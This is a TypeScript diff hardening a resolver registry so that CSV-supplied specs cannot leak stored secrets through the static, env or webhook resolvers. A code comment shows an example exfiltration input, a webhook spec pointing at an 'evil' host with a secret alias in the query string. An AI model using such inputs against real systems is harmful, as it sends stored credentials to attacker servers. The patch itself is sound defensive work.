@@ -40,6 +40,13 @@ export interface ResolverContext {
     smsNumber?: string | undefined;
     smsNumberCountryCode?: string | undefined;
   } | undefined;
+  /**
+   * SEC-1: names of the `@aliases` (stored secrets) this spec actually
+   * expanded. Resolvers that send data to a CSV-chosen destination (webhook
+   * URL, IMAP host) refuse or restrict when this is non-empty, so a
+   * third-party CSV cannot aim a stored secret at its own server.
+   */
+  usedAliases?: string[] | undefined;
 }
 
 export type ResolverFn = (
@@ -96,8 +103,14 @@ export class ResolverRegistry {
     // same as Jancy; aliases are the way to store them.
     const rawIdx = spec.indexOf(":");
     const rawArgs = rawIdx === -1 ? "" : spec.slice(rawIdx + 1);
+    const usedAliases = aliases
+      ? [...spec.matchAll(/@([A-Za-z0-9_.-]+)/g)]
+          .map((m) => m[1]!)
+          .filter((n, i, all) => all.indexOf(n) === i && aliases.get(n) !== null)
+      : [];
     const full: ResolverContext = {
       ...ctx,
+      usedAliases,
       resolverArgs:
         rawArgs === ""
           ? []
@@ -118,13 +131,31 @@ export class ResolverRegistry {
  *  textchest / victorylive-style providers. Provider plugins override these
  *  names never — they register their own. */
 export function registerBuiltinResolvers(reg: ResolverRegistry): void {
-  reg.register("static", async (args) => args);
+  // SEC-1 (audit F1): a resolved value is returned to the caller and can be
+  // autofilled into whatever page a CSV-chosen Site column matches. Stored
+  // secrets (@aliases) are API tokens for resolvers, never page values.
+  reg.register("static", async (args, ctx) => {
+    if (ctx.usedAliases && ctx.usedAliases.length > 0) {
+      return `#BAD ALIAS stored secrets are not returned as values (@${ctx.usedAliases[0]}) — use $literal for a site password`;
+    }
+    return args;
+  });
+  // Same exfiltration shape for process env (SPECTRA_API_TOKEN, …): only
+  // variables the operator deliberately exposes, prefixed QP_VALUE_.
   reg.register("env", async (args) => {
+    if (!/^QP_VALUE_[A-Z0-9_]+$/.test(args)) {
+      return `#BAD ALIAS env: only reads variables named QP_VALUE_* (got ${args.slice(0, 40)})`;
+    }
     const v = process.env[args];
     if (v === undefined) throw new Error(`#NO ACCOUNT env:${args}`);
     return v;
   });
   reg.register("webhook", async (args, ctx) => {
+    // SEC-1: the URL comes from the CSV, so a stored secret must never ride
+    // along to it (`webhook:https://evil/?k=@aycd`).
+    if (ctx.usedAliases && ctx.usedAliases.length > 0) {
+      return `#BAD ALIAS stored secrets are never sent to a webhook URL (@${ctx.usedAliases[0]})`;
+    }
     // webhook:<url>[:<jsonPath>] — POSTs {email, site, field}, extracts the
     // code by dotted path from the JSON response (default path: "code").
     // The url may itself contain ':' (scheme, port), so the jsonPath is
